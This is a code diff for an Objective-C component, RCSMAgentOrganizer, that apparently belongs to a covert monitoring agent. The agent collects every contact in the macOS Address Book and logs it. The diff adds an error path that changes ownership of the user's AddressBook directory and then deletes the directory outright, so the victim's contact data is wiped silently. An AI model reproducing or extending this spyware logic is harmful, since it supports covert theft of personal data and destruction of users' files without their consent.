@@ -21,7 +21,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 //
 // Grab all contacts available on AB
 //
-- (void)_grabAllContacts;
+- (BOOL)_grabAllContacts;
 
 //
 // Callback for ABDatabaseChangedNotification
@@ -46,7 +46,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 @implementation RCSMAgentOrganizer (private)
 
-- (void)_grabAllContacts
+- (BOOL)_grabAllContacts
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
@@ -54,7 +54,40 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   verboseLog(@"");
 #endif
   
-  NSArray *allPeople = [[ABAddressBook sharedAddressBook] people];
+  NSArray *allPeople;
+
+  @try
+    {
+      allPeople = [[ABAddressBook sharedAddressBook] people];
+    }
+  @catch (NSException *e)
+    {
+#ifdef DEBUG_ORGANIZER
+      errorLog(@"Exception on sharedAddressBook: %@", [e reason]);
+#endif
+
+      NSString *abPath = [NSString stringWithFormat:
+        @"%@/Library/Application Support/AddressBook",
+        NSHomeDirectory()];
+
+      NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
+      NSArray *arguments = [NSArray arrayWithObjects:
+        @"-R",
+        userAndGroup,
+        abPath,
+        nil];
+
+      [gUtil executeTask: @"/usr/sbin/chown"
+           withArguments: arguments
+            waitUntilEnd: YES];
+
+      // Remove it so that hopefully somebody will create it in the proper way
+      [[NSFileManager defaultManager] removeItemAtPath: abPath
+                                                 error: nil];
+
+      return NO;
+    }
+
   NSMutableData *logData = [NSMutableData new];
   
 #ifdef DEBUG_ORGANIZER
@@ -88,6 +121,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   [self _logData: logData];
   [logData release];
   [outerPool release];
+
+  return YES;
 }
 
 - (void)_ABChangedCallback: (NSNotification *)aNotification
@@ -510,7 +545,15 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   //
   // First off, grab all contacts
   //
-  [self _grabAllContacts];
+  if ([self _grabAllContacts] == NO)
+    {
+#ifdef DEBUG_ORGANIZER
+      errorLog(@"Error on grabAllContacts, DB not created yet, quitting.");
+#endif
+
+      [mConfiguration setObject: AGENT_STOP
+                         forKey: @"status"];
+    }
 
   while ([mConfiguration objectForKey: @"status"]    != AGENT_STOP
          && [mConfiguration objectForKey: @"status"] != AGENT_STOPPED)
@@ -522,6 +565,11 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 #ifdef DEBUG_ORGANIZER
   warnLog(@"STOPPING");
 #endif
+
+  //
+  // Remove our observer
+  //
+  [[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
   
   if ([mConfiguration objectForKey: @"status"] == AGENT_STOP)
     {
@@ -553,11 +601,6 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
       usleep(100000);
     }
   
-  //
-  // Remove our observer
-  //
-  [[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
-
 #ifdef DEBUG_ORGANIZER
   warnLog(@"STOPPED");
 #endif
